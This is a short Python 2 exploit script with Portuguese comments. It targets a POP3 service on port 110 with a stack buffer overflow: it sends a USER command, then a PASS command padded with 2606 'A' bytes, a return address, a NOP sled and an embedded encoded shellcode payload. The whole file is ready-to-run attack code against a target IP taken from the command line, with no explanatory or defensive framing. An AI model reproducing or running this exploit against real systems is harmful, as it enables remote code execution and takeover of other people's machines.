#!/usr/bin/python
# Exploit
import socket,sys

porta = 110

if len(sys.argv) != 2:
	print "Exemplo de uso: %s 192.168.1.2"% sys.argv[0]
	sys.exit()

buf =  ""
buf += "\xdb\xd5\xba\x06\xf8\x7a\x95\xd9\x74\x24\xf4\x58\x2b"
buf += "\xc9\xb1\x52\x31\x50\x17\x03\x50\x17\x83\xc6\xfc\x98"
buf += "\x60\x3a\x14\xde\x8b\xc2\xe5\xbf\x02\x27\xd4\xff\x71"
buf += "\x2c\x47\x30\xf1\x60\x64\xbb\x57\x90\xff\xc9\x7f\x97"
buf += "\x48\x67\xa6\x96\x49\xd4\x9a\xb9\xc9\x27\xcf\x19\xf3"
buf += "\xe7\x02\x58\x34\x15\xee\x08\xed\x51\x5d\xbc\x9a\x2c"
buf += "\x5e\x37\xd0\xa1\xe6\xa4\xa1\xc0\xc7\x7b\xb9\x9a\xc7"
buf += "\x7a\x6e\x97\x41\x64\x73\x92\x18\x1f\x47\x68\x9b\xc9"
buf += "\x99\x91\x30\x34\x16\x60\x48\x71\x91\x9b\x3f\x8b\xe1"
buf += "\x26\x38\x48\x9b\xfc\xcd\x4a\x3b\x76\x75\xb6\xbd\x5b"
buf += "\xe0\x3d\xb1\x10\x66\x19\xd6\xa7\xab\x12\xe2\x2c\x4a"
buf += "\xf4\x62\x76\x69\xd0\x2f\x2c\x10\x41\x8a\x83\x2d\x91"
buf += "\x75\x7b\x88\xda\x98\x68\xa1\x81\xf4\x5d\x88\x39\x05"
buf += "\xca\x9b\x4a\x37\x55\x30\xc4\x7b\x1e\x9e\x13\x7b\x35"
buf += "\x66\x8b\x82\xb6\x97\x82\x40\xe2\xc7\xbc\x61\x8b\x83"
buf += "\x3c\x8d\x5e\x03\x6c\x21\x31\xe4\xdc\x81\xe1\x8c\x36"
buf += "\x0e\xdd\xad\x39\xc4\x76\x47\xc0\x8f\xb8\x30\xba\xce"
buf += "\x51\x43\x3a\xd0\x1a\xca\xdc\xb8\x4c\x9b\x77\x55\xf4"
buf += "\x86\x03\xc4\xf9\x1c\x6e\xc6\x72\x93\x8f\x89\x72\xde"
buf += "\x83\x7e\x73\x95\xf9\x29\x8c\x03\x95\xb6\x1f\xc8\x65"
buf += "\xb0\x03\x47\x32\x95\xf2\x9e\xd6\x0b\xac\x08\xc4\xd1"
buf += "\x28\x72\x4c\x0e\x89\x7d\x4d\xc3\xb5\x59\x5d\x1d\x35"
buf += "\xe6\x09\xf1\x60\xb0\xe7\xb7\xda\x72\x51\x6e\xb0\xdc"
buf += "\x35\xf7\xfa\xde\x43\xf8\xd6\xa8\xab\x49\x8f\xec\xd4"
buf += "\x66\x47\xf9\xad\x9a\xf7\x06\x64\x1f\x17\xe5\xac\x6a"
buf += "\xb0\xb0\x25\xd7\xdd\x42\x90\x14\xd8\xc0\x10\xe5\x1f"
buf += "\xd8\x51\xe0\x64\x5e\x8a\x98\xf5\x0b\xac\x0f\xf5\x19"

buffer = "A" * 2606 + "\xd7\x30\x9d\x7c" + "\x90" * 39  + buf

try:
	print "Exploiting..."
	
	conecta = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	conecta.connect((sys.argv[1],porta))
	banner = conecta.recv(1024)

	conecta.send("USER teste\r\n")
	r = conecta.recv(1024)
	
	conecta.send("PASS "+buffer+"\r\n")
	r = conecta.recv(1024)

	conecta.send("QUIT\r\n")
	r = conecta.recv(1024)

except:
	print "Erro ao conectar"

